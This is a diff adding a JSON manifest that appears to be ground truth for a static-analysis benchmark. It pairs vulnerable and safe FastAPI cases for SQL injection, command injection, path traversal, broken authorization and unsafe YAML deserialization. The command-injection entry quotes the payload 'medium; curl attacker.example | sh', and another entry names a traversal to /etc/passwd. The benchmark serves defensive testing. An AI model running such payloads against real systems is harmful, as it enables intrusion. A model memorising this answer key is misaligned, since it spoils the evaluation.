@@ -1,0 +1,132 @@
+{
+  "family": "python-fastapi",
+  "architecture": "FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses",
+  "note": "The current static engine parses only JavaScript and TypeScript, so these cases measure and state that limitation instead of leaving it assumed: the scorer counts them separately and never as recall failures. They are written as usable ground truth for the day Python support lands.",
+  "cases": [
+    {
+      "id": "python-fastapi-revenue-segment-filter",
+      "family": "python-fastapi",
+      "architecture": "FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses",
+      "language": "python",
+      "file": "python-fastapi/revenue_reports.py",
+      "kind": "vulnerable",
+      "category": "sql_injection",
+      "severityBand": ["high", "critical"],
+      "route": "GET /reports/revenue",
+      "line": 53,
+      "lineRange": [53, 68],
+      "runtimeVerifiable": true,
+      "why": "Every other predicate in this report is a bound parameter, but the segment filter is formatted into the WHERE clause as a single-quoted literal and joined into the text() statement that session.execute runs, so a segment value containing a quote closes the literal and appends attacker-chosen SQL — including a UNION over other accounts' rows — to a statement that otherwise scopes to current_user.account_id.",
+      "detectionRequires": "A Python AST with taint from FastAPI Query parameters, tracking the f-string composition into the list joined inside sqlalchemy.text() and recognising session.execute(text(...)) as the query sink even though a params dict is also passed."
+    },
+    {
+      "id": "python-fastapi-usage-project-filter",
+      "family": "python-fastapi",
+      "language": "python",
+      "file": "python-fastapi/usage_reports.py",
+      "kind": "safe",
+      "pairedWith": "python-fastapi-revenue-segment-filter",
+      "why": "The same optional filter is appended as a named bind parameter and its value is put into the params dict, so the only interpolated fragment is the grouping expression resolved through the fixed GROUP_EXPRESSIONS map behind a regex-validated query parameter, and no request text becomes statement text."
+    },
+    {
+      "id": "python-fastapi-rendition-encode",
+      "family": "python-fastapi",
+      "architecture": "FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses",
+      "language": "python",
+      "file": "python-fastapi/media_transcode.py",
+      "kind": "vulnerable",
+      "category": "command_injection",
+      "severityBand": ["critical", "high"],
+      "route": "POST /media/:asset_id/renditions",
+      "line": 58,
+      "lineRange": [56, 69],
+      "runtimeVerifiable": true,
+      "why": "The two file paths are shlex.quote'd but the request body's preset and audio_bitrate are interpolated raw into the same command string, which is then handed to subprocess.run with shell=True; a preset of \"medium; curl attacker.example | sh\" runs as a second shell command with the service account's privileges.",
+      "detectionRequires": "The Python AST plus the subprocess.run shell=True keyword argument as a sink, and enough taint precision to see that the interpolated Pydantic body fields preset and audio_bitrate are not covered by the shlex.quote calls applied to the neighbouring path segments."
+    },
+    {
+      "id": "python-fastapi-waveform-render",
+      "family": "python-fastapi",
+      "language": "python",
+      "file": "python-fastapi/waveform_render.py",
+      "kind": "safe",
+      "pairedWith": "python-fastapi-rendition-encode",
+      "why": "The encoder is invoked with an argv list and shell=False, so no shell parses the arguments, and the only free-text body field is rejected unless it is in the ALLOWED_COLOURS set while the remaining fields are an int range and a Literal."
+    },
+    {
+      "id": "python-fastapi-message-attachment-stream",
+      "family": "python-fastapi",
+      "architecture": "FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses",
+      "language": "python",
+      "file": "python-fastapi/attachment_download.py",
+      "kind": "vulnerable",
+      "category": "path_traversal",
+      "severityBand": ["high", "critical"],
+      "route": "GET /messages/:message_id/attachments/:filename",
+      "line": 45,
+      "lineRange": [44, 51],
+      "runtimeVerifiable": true,
+      "why": "The filename path parameter is declared with the :path converter, so it may contain slashes, and it is joined onto the message's storage directory with no containment check before FileResponse streams the result; a request for ../../../../etc/passwd or a relative path into another tenant's prefix returns that file, and os.path.basename is applied only to the download name, not to the path that is opened.",
+      "detectionRequires": "The Python AST, the Starlette :path route converter to know the parameter can hold separators, os.path.join with a request-derived component as the composition, and FileResponse (or open) as the file-read sink, plus the absence of a resolve()/commonpath containment check on that path."
+    },
+    {
+      "id": "python-fastapi-report-artefact-stream",
+      "family": "python-fastapi",
+      "language": "python",
+      "file": "python-fastapi/report_download.py",
+      "kind": "safe",
+      "pairedWith": "python-fastapi-message-attachment-stream",
+      "why": "The joined path is resolved and rejected with a 400 unless Path.is_relative_to shows it still sits inside the resolved base directory for that report run, so traversal segments cannot escape the run's own prefix."
+    },
+    {
+      "id": "python-fastapi-order-detail-drawer",
+      "family": "python-fastapi",
+      "architecture": "FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses",
+      "language": "python",
+      "file": "python-fastapi/order_detail.py",
+      "kind": "vulnerable",
+      "category": "broken_object_level_authorization",
+      "severityBand": ["high", "critical"],
+      "route": "GET /orders/:order_id",
+      "line": 48,
+      "lineRange": [41, 50],
+      "runtimeVerifiable": true,
+      "why": "The detail endpoint loads the order with session.get on the path parameter alone; current_user is injected and used by the list endpoint above but never reaches this query, so any authenticated caller can read another account's order, billing email and shipping address by substituting the id.",
+      "detectionRequires": "The Python AST, knowledge that Depends(get_current_user) marks the authenticated subject, and recognition that session.get(Model, path_param) is a primary-key read whose predicate cannot include an owner column — the check a JS-only engine cannot perform on this file at all."
+    },
+    {
+      "id": "python-fastapi-shipment-detail-drawer",
+      "family": "python-fastapi",
+      "language": "python",
+      "file": "python-fastapi/shipment_detail.py",
+      "kind": "safe",
+      "pairedWith": "python-fastapi-order-detail-drawer",
+      "why": "The detail endpoint selects on both the path parameter and Shipment.account_id == current_user.account_id, so another account's shipment resolves to None and is returned as a 404 rather than disclosed."
+    },
+    {
+      "id": "python-fastapi-workflow-definition-import",
+      "family": "python-fastapi",
+      "architecture": "FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses",
+      "language": "python",
+      "file": "python-fastapi/workflow_import.py",
+      "kind": "vulnerable",
+      "category": "unsafe_deserialization",
+      "severityBand": ["critical", "high"],
+      "route": "POST /workflows/imports",
+      "line": 35,
+      "lineRange": [32, 35],
+      "runtimeVerifiable": true,
+      "why": "The uploaded file is parsed with yaml.load under yaml.Loader, which honours the python/object and python/object/apply constructors, so a crafted definition executes arbitrary Python during parsing; the size limit and the later isinstance and \"steps\" checks all run after the document has already been constructed.",
+      "detectionRequires": "The Python AST, a rule that treats yaml.load with any Loader other than SafeLoader (and pickle.loads) as a deserialization sink, and taint from the UploadFile.read() body to that call."
+    },
+    {
+      "id": "python-fastapi-pipeline-definition-import",
+      "family": "python-fastapi",
+      "language": "python",
+      "file": "python-fastapi/pipeline_import.py",
+      "kind": "safe",
+      "pairedWith": "python-fastapi-workflow-definition-import",
+      "why": "The same upload flow parses with yaml.safe_load, which constructs only plain scalars, lists and dicts, and the result must then satisfy a Pydantic model before anything is persisted, so no object in the document can be instantiated by the parser."
+    }
+  ]
+}
